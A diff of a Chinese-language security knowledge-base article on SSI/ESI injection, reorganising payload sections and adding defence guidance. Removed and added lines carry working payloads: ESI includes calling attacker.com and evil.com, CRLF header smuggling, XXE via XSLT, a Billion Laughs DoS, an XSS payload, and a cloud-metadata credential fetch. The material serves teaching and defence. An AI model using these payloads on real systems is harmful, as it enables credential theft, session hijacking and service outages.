-此技术与传统 [XSS](../../User%20input/Reflected%20Values/XSS/README.md) 的区别在于注入发生在边缘层、执行对象是缓存后的响应。
-
-## 5.3 响应头注入 / Open Redirect
-
-#### 原语
+不要与 "Local File Inclusion" 混淆：
 
 ```html
-$add_header()
+<esi:include src="secret.txt">
 ```
 
-#### Payload
+该指令使缓存节点读取其可达的本地 / 内部文件（相对路径）并注入响应——泄露的是**缓存节点视角**的文件，而非应用服务器的本地文件系统，因此不等同于传统 LFI。
 
-Open Redirect
-
-```html
-<!--esi $add_header('Location','http://attacker.com') -->
-```
-
-修改 Content-Type（XSS 绕过）
-
-```html
-<!--esi $add_header('Content-Type','text/html') -->
-```
-
-组合攻击
-
-```html
-<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode(...) /-->
-```
-
-#### 利用条件
-
-- 支持 header 操作
-
-#### 风险等级
-
-高
-
-#### 实战要点
-
-- 绕过：
-  - `Content-Type: application/json`
-- 可变为：
-  - HTML → 执行 JS
-
----
-
-# 0x06 ESI 攻击矩阵 — 请求级控制与解析器特性滥用
-
-## 6.1 CRLF 注入（请求走私辅助）
-
-#### Payload
-
-```html
-<esi:include src="http://anything.com%0d%0aX-Forwarded-For:127.0.0.1"/>
-```
-
-变体（HackTricks，双换行加 JunkHeader）：
+## 4.5 CRLF 注入
 
 ```html
 <esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
 ```
 
-#### 高级（CVE-2019-2438）
+在 `src` 属性 URL 中编码 CRLF，可向 ESI 引擎发起的请求追加任意头（如伪造 `X-Forwarded-For: 127.0.0.1`），结合 [CRLF 注入](../../User%20input/Reflected%20Values/CRLF/README.md) 原理实现头走私。
 
-```html
-<esi:request_header name="User-Agent" value="12345
-Host: evil.com"/>
+## 4.6 开放重定向
+
+以下指令会向响应添加 `Location` 头：
+
+```bash
+<!--esi $add_header('Location','http://attacker.com') -->
 ```
 
-**机制**（GoSecure Part 2 原文）：利用 `esi:request_header` 值内的换行注入新的 `Host` 头实现 SSRF。示例选择 User-Agent 是因为 `Host` 本身在黑名单中。由于自定义头被添加在 HTTP 请求的开头，注入的 `Host` 头可覆盖原始目标主机；除 IIS 与 Lighttpd 会忽略含多个 Host 头的请求外，多数 Web 容器采用第一个 `Host` 头。
+即通过 ESI 引擎实现 [Open Redirect](../../User%20input/Reflected%20Values/Open%20Redirect/README.md)。
 
-#### 利用条件
+## 4.7 添加请求头与响应头
 
-- ESI 未过滤 CRLF
+- 在强制发起的请求中添加头：
 
-#### 风险等级
-
-高
-
-#### 实战要点
-
-- 可结合：
-  - 请求走私
-  - 伪造源 IP
-
-与 [CRLF](../../User%20input/Reflected%20Values/CRLF/README.md) 注入的经典场景相比，此处 CRLF 在**代理发出的上游请求**中生效，可直接辅助 [HTTP Request Smuggling](../HTTP%20Request%20Smuggling/README.md)。
-
-## 6.2 Header 注入（请求级控制）
-
-#### Payload
-
-```html
-<esi:include src="http://example.com">
-  <esi:request_header name="User-Agent" value="evil"/>
+```xml
+<esi:include src="http://example.com/asdasd">
+<esi:request_header name="User-Agent" value="12345"/>
 </esi:include>
 ```
 
-#### 利用条件
+- 在响应中添加头（用于绕过带 XSS 的响应中 `Content-Type: text/json`）：
 
-- 支持 `esi:request_header`
+```bash
+<!--esi/$add_header('Content-Type','text/html')/-->
 
-#### 风险等级
+<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->
 
-中高
-
-#### 实战要点
-
-- 用于：
-  - 绕过认证
-  - SSRF 精细化利用
-
-## 6.3 XXE（ESI + XSLT ⭐ 高级）
-
-#### 原语
-
-```html
-dca="xslt"
+# Check the number of url_decode to know how many times you can URL encode the value
 ```
 
-#### Payload
+`$add_header('Content-Type','text/html')` 将 `text/json` 响应改为可渲染的 HTML，使原本被浏览器拒绝的 XSS 生效；`$url_decode` 嵌套层数对应 payload 可被 URL 编码的次数——需根据应用实际解码次数调整。
 
-```html
-<esi:include 
-  src="http://host/poc.xml"
-  dca="xslt"
-  stylesheet="http://host/poc.xsl"/>
-```
-
-#### 恶意 XSLT
+## 4.8 Add Header 中的 CRLF（CVE-2019-2438）
 
 ```xml
-<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file">]>
-<foo>&xxe;</foo>
+<esi:include src="http://example.com/asdasd">
+<esi:request_header name="User-Agent" value="12345
+Host: anotherhost.com"/>
+</esi:include>
 ```
 
-#### 利用条件
+`esi:request_header` 的 `value` 属性中未过滤 CRLF，可在请求头值中注入完整的新头（如上例将 `Host` 篡改为 `anotherhost.com`）——对应 **CVE-2019-2438**（Oracle 相关组件，详见 [GoSecure Part 2](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)）。受影响产品与版本细节见参考资料链接。
 
-- 支持 XSLT
-- 未禁用外部实体
+## 4.9 Akamai debug 信息泄露
 
-#### 风险等级
-
-极高
-
-#### 实战要点
-
-- **能力边界**（GoSecure Part 1 实测）：底层库 Xalan **不解析外部 DTD**，因此该向量**无法读取本地文件**——"文件读取"是常见误解。真实影响：
-  - SSRF（与 `esi:include` 本身能力冗余）
-  - **Billion Laughs 实体膨胀 DoS**（主要危害）
-- Akamai ETS 的 Billion Laughs 实测：GoSecure 用 ETS Docker 镜像复现，32GB 内存的机器上数秒内服务停滞：
+这将在响应中包含调试信息：
 
 ```xml
-<?xml version="1.0"?>
-<!DOCTYPE lolz [
- <!ENTITY lol "lol">
- <!ELEMENT lolz (#PCDATA)>
- <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
- <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
- <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
- <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
- <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
- <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
- <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
- <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
- <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
-]>
-<lolz>&lol9;</lolz>
-```
-
-- 对比：**ESIGate**（Part 2 的 XSLT to RCE）走的是另一条路——Java 默认解析器允许 Xalan 扩展函数，直接 RCE，而非 XXE
-- 详见 XSLT Server Side Injection 专题：[XSLT Server Side Injection — ZhaoHuaXiShi 知识库](../XSLT%20Server%20Side%20Injection/README.md)
-
-## 6.4 调试信息泄露（Akamai 特性）
-
-#### Payload
-
-```html
 <esi:debug/>
 ```
 
-#### 适用对象
+仅对 Akamai 有效。调试信息可能包含内部请求处理细节，形成信息泄露。
 
-- Akamai
+# 0x05 ESI + XSLT = XXE
 
-#### 风险等级
+## 5.1 dca="xslt" 机制
 
-中
+在 ESI 中可以使用 **XSLT（eXtensible Stylesheet Language Transformations）** 语法，只需将参数 **`dca`** 的值指定为 **`xslt`**。这可能允许滥用 **XSLT** 来创建并利用 XML 外部实体（XXE）漏洞：
 
-#### 实战要点
-
-- 泄露：
-  - 内部路径
-  - 处理逻辑
-  - 节点信息
-
----
-
-# 0x07 攻击链与实战建议
-
-## 7.1 重点入口
-
-优先测试：
-
-- 搜索框 `/search?q=`
-- 评论 `/comment`
-- 用户资料 `/profile`
-- Header 注入（User-Agent / Referer）
-
-## 7.2 链式攻击路径
-
-#### 🔥 链 1：ESI → SSRF → 云接管
-
-```text
-ESI 注入
- → 访问 169.254.169.254
- → 获取凭证
- → 接管云资源
+```xml
+<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
 ```
 
-#### 🔥 链 2：ESI → Cookie → 会话劫持
+## 5.2 XXE 载荷
 
-```text
-$(HTTP_COOKIE)
- → 外带
- → 登录态接管
+XSLT 文件（`poc.xsl`）：
+
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
+<foo>&xxe;</foo>
 ```
 
-#### 🔥 链 3：ESI → Header → XSS
+ESI 处理器将远端 XML（`poc.xml`）交由 XSLT 引擎转换，若转换过程解析外部实体，`&xxe;` 将被替换为 `http://evil.com/file` 的内容——攻击者服务器收到的实体引用请求或响应中的实体展开即为 [XXE](../../User%20input/Structured%20objects/XXE/README.md) 确认信号。
 
-```text
-修改 Content-Type
- → JSON → HTML
- → 执行 JS
+## 5.3 XSLT SSRF 载荷
+
+来自 XSLT 文档的 ESI SSRF 载荷（`stylesheet` 指向攻击者控制的 XSL）：
+
+```xml
+<esi:include src="http://10.10.10.10/data/news.xml" stylesheet="http://10.10.10.10//news_template.xsl">
+</esi:include>
 ```
 
-#### 🔥 链 4：ESI → Cache Poisoning → 全站攻击
+XSLT 引擎的进一步利用（`document()`、`unparsed-text()`、扩展函数、EXSLT 元素）见 [XSLT Server Side Injection](../XSLT%20Server%20Side%20Injection/README.md) 文档。
 
-```text
-注入 ESI
- → CDN缓存
- → 所有用户执行 payload
-```
+## 5.4 条件与限制
 
-## 7.3 云环境重点
-
-获取 `AWS AK/SK`、`Token`
-
-```html
-<esi:include src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"/>
-```
-
-## 7.4 与缓存投毒结合
-
-ESI + Cache Poisoning：
-
-```text
-注入 ESI → CDN缓存污染 → 所有用户被攻击
-```
-
-结合 [Cache Poisoning&Cache Deception](../Cache%20Poisoning%26Cache%20Deception/README.md) 中的缓存键分析方法，可系统化构造"注入 ESI → CDN 缓存污染 → 全站攻击"的完整链路。
-
-## 7.5 在进行城市级系统安全评估或数据安全审计时，应注意以下隐蔽路径：
-
-1. **缓存层绕过**：许多 WAF 部署在 Web 服务器前端，但如果 ESI 标签是在后端被注入，然后在返回过程中由 CDN 解析，则可以绕过传统的输入过滤。
-2. **Cookie 泄露风险**：在审计带有高强度 Cookie 保护（如 `HttpOnly`, `SameSite`）的系统时，务必检查是否存在 ESI 注入。这是**极少数能让攻击者直接在服务端读取并发送 HttpOnly Cookie** 的手段。
-3. **内网探测**：ESI 产生的 SSRF 通常源于 CDN 节点或企业边缘代理，这使得攻击者可以探测原本不可达的内部管理接口（如 Varnish 的管理后台或集群内网资源）。
-
----
-
-# 0x08 Fuzzing 与自动化
-
-## 8.1 Brute-Force 检测字典
-
-使用 [ssi_esi.txt](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt) 对用户反射点进行 Fuzz：
-
-```bash
-# 下载字典并 Fuzz
-curl -sL https://raw.githubusercontent.com/carlospolop/Auto_Wordlists/main/wordlists/ssi_esi.txt -o /tmp/ssi_esi.txt
-ffuf -u 'https://target.com/search?q=FUZZ' -w /tmp/ssi_esi.txt -mr 'root:|www-data|<!--#echo|hello'
-```
-
-## 8.2 Burp Suite 自动化
-
-- **插件推荐**：使用 `ESI Injector` 或自定义扫描规则。
-- **Fuzz 列表**：重点关注 `/search`、`/comment` 等用户输入会反射到页面中的位置。
-- **Intruder 字典**：将 ssi_esi.txt 导入 Burp Intruder 进行参数化 Fuzz。
-
----
-
-# 0x09 总结
-
-> **ESI 注入 ≠ 模板注入，而是"边缘计算层的 SSRF + 数据窃取 + 响应劫持"综合漏洞。**
-
----
+- 需要目标 ESI 实现支持 `dca="xslt"` 参数（如 Akamai 实现）。
+- 若 ESI 实现存在 Host Allowlist（§2.3），`src` 与 `stylesheet` 的远端地址受限于允许列表。
+- XXE 是否触发取决于 XSLT 引擎的实体解析配置，与 [XSLT 注入](../XSLT%20Server%20Side%20Injection/README.md) 的利用条件一致。
 
 # 0x0A 防御、检测与工具
 
-## A.1 开发层面
+## A.1 检测方法论
 
-1. **禁用 SSI/ESI 解析**（如果业务不需要）：
-   - Apache：移除 `mod_include` 或设置 `Options -Includes`；若必须保留 SSI，使用 `Options +IncludesNOEXEC` 禁用 `exec`
-   - Nginx：禁用 `ssi on` 指令
-   - Varnish：移除或限制 ESI 处理规则
-   - CDN（Akamai/Fastly/Cloudflare）：检查 ESI 是否启用，按需关闭
+1. **输入点排查**：所有反射 / 存储内容位置（参数回显、上传、错误页）逐个提交 SSI / ESI 探测 payload（§2.1、§2.2）。
+2. **响应头指纹**：检查 `Surrogate-Control: content="ESI/1.0"`；缺失不代表不存在 ESI。
+3. **盲检测**：`<esi:include src=http://attacker.com>` 观察回连请求。
+4. **爆破字典**：使用 [ssi_esi.txt](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt) 对输入点批量提交常见 SSI / ESI 载荷。
 
-2. **输入验证**：拒绝或转义包含 SSI/ESI 语法的用户输入：
-   ```text
-   <!--# ... --> / <esi: ... > / $(...) 
-   ```
+## A.2 加固建议
 
-3. **沙箱与限制**：如果必须保留 ESI，实施主机白名单限制 `esi:include` 只能访问受信任的内部主机
+**SSI 侧：**
 
-4. **响应头控制**：在上游应用中显式设置 `Surrogate-Control: content="ESI/1.0"` 仅对需要 ESI 处理的页面启用
+- 仅在必要时启用 SSI（Apache `mod_include`），并尽量只对 `.shtml` 等专用扩展名开启。
+- 使用 Apache 的 `Options IncludesNOEXEC` 替代 `Options Includes` 禁用 `exec` 指令——即使 SSI 被注入，也无法执行系统命令（其余指令仍可用，因此仍需控制输入）。Apache 官方文档原文：「If users can edit content on your site, ensure this feature is disabled by using IncludesNOEXEC instead of Includes in the Options directive.」
+- 用户输入在写入任何被 SSI 解析的页面之前，剥离或转义 `<!--#` 序列。
 
-5. **最小权限原则**：SSI 的 `exec cmd` 和 ESI 的 XSLT 转换以最低权限运行
+**ESI 侧：**
 
-## A.2 检测层面
+- 利用 ESI 实现自身的安全属性收紧攻击面：启用 **Upstream Headers Required**（要求上游应用提供头才处理 ESI 语句）与 **Host Allowlist**（include 仅允许白名单主机）——对应 §2.3 能力矩阵中的防护维度。
+- 输入过滤需覆盖 ESI 语法（`<esi:`、`<!--esi` 等标记），普通 HTML 过滤通常不识别 ESI 命名空间。
+- 缓存层对 `esi:request_header` 值中的 CRLF 做过滤 / 拒绝（CVE-2019-2438 修复思路）。
 
-- **WAF 规则**：检测请求中 `<esi:`、`<!--#exec`、`$(HTTP_COOKIE)` 等 ESI/SSI 特征
-- **RASP**：运行时拦截通过 ESI-include 发起的异常出站请求（尤其是到云 metadata 地址）
-- **SAST**：扫描代码中用户输入直接拼入 `.shtml` 模板或经过 ESI 处理器的路径
-- **DAST**：使用 ssi_esi.txt 字典对反射点进行 Fuzz
+## A.3 工具与字典
 
-## A.3 应急响应
-
-- 确认 ESI/SSI 引擎类型和版本（通过 `Surrogate-Control` 响应头、`<esi:debug/>` 等手段）
-- 审计 `esi:include` 的出站请求日志，识别已被利用的注入点
-- 检查是否有 Cookie 通过 `$(HTTP_COOKIE)` 泄露的证据（外带 DNS/HTTP 日志）
-- 如果使用 Akamai，检查 `<esi:debug/>` 是否暴露了内部路径信息
-
----
-
-## 知识路径
-
-```
-SSI & ESI Injection（本文档）
-  ├── 前置知识：HTTP 缓存/代理架构 · SSI/ESI 基础语法
-  ├── 相关：XSLT Server Side Injection — ESI 的 stylesheet 属性是 XSLT 注入载体之一
-  ├── 相关：Cache Poisoning&Cache Deception — 链 4 的组合技术
-  ├── 相关：SSRF — 链 1 的内网探测与云凭证窃取
-  ├── 相关：XSS — 边缘层 XSS 与传统反射型 XSS 的对比
-  ├── 相关：CRLF — 上游请求头注入
-  └── 相关：HTTP Request Smuggling — CRLF 与 request_header 的走私辅助
-```
-
----
+| 工具 | 用途 |
+|------|------|
+| [ssi_esi.txt 爆破字典](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt) | 92 条 SSI / ESI 检测载荷批量提交（已提取验证：含 50+ `echo` 环境变量枚举、`exec` 命令变体、`config`/`fsize`/`flastmod`/`include`/`printenv` 指令、ESI `debug`/`include`/`assign` 载荷） |
+| Burp Suite | 请求构造、`%0d%0a` 编码载荷、响应对比 |
+| 自建 HTTP 监听器 | ESI 盲检测回连确认 |
 
 ## 参考资料
 
-- [Apache mod_include — SSI 官方文档](https://httpd.apache.org/docs/current/howto/ssi.html)
-- [GoSecure — Beyond XSS: Edge Side Include Injection (Part 1)（原 gosecure.net 已迁移至 gosecure.ai）](https://gosecure.ai/blog/beyond-xss-edge-side-include-injection)
-- [GoSecure — ESI Injection Part 2: Abusing Specific Implementations（作者镜像，原 gosecure.net 已失效）](https://blog.h3xstream.com/2019/05/esi-injection-part-2-abusing-specific.html)
-- [CVE-2019-2438 — ESI include 头部注入 SSRF](https://nvd.nist.gov/vuln/detail/CVE-2019-2438)
-- [InfoSecWriteups — Exploring the World of ESI Injection](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)
-- [HackTricks — Server Side Inclusion/Edge Side Inclusion Injection（方法论）](https://hacktricks.wiki/en/pentesting-web/server-side-inclusion-edge-side-inclusion-injection.html)
-- [Auto_Wordlists — ssi_esi.txt Fuzzing Dictionary](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt)
-- [XSLT Server Side Injection (关联技术) — ZhaoHuaXiShi 知识库](../XSLT%20Server%20Side%20Injection/README.md)
-- [Cache Poisoning & Cache Deception (关联技术) — ZhaoHuaXiShi 知识库](../Cache%20Poisoning%26Cache%20Deception/README.md)
-- [SSRF (关联技术) — ZhaoHuaXiShi 知识库](../../User%20input/Reflected%20Values/SSRF/README.md)
+- [2/5 DEGRADED] [GoSecure — Beyond XSS: Edge Side Include Injection](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) — 状态：域名重定向至官网首页（博客已迁移） | 结果：正文不可达 | 动作：核心内容（§2.3 能力矩阵）已由 hacktricks 二手源内联保留，无需额外动作
+- [2/5 DEGRADED] [GoSecure — ESI Injection Part 2: Abusing specific implementations](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/) — 状态：同上重定向 | 结果：正文不可达 | 动作：核心内容（CVE-2019-2438 payload）已由 hacktricks 二手源内联保留，CVE 受影响产品细节标记 NEEDS_HUMAN_REVIEW
+- [1/5 DEGRADED] [InfoSec Writeups — Exploring the world of ESI Injection](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91) — 状态：Cloudflare 机器人验证墙（curl 与 Playwright 均被拦） | 结果：正文不可达 | 动作：源中无引用内容，仅作参考链接保留
+- [5/5 VERIFIED] [Apache — Apache Tutorial: Introduction to Server Side Includes](https://httpd.apache.org/docs/current/howto/ssi.html) — 状态：curl → 200 OK, 21 KB | 结果：正文✓ 技术✓ 非空壳✓ 非摘要✓ 内容已提取✓（exec 执行环境、config 指令、IncludesNOEXEC 安全章节已补充 §3.1/§3.2/§3.4/§A.2）
+- [5/5 VERIFIED] [Auto_Wordlists — ssi_esi.txt](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt) — 状态：curl raw.githubusercontent → 200 OK, 92 行 | 结果：正文✓ 技术✓ 非空壳✓ 非摘要✓ 内容已提取✓（字典内容摘要已补充 §A.3）
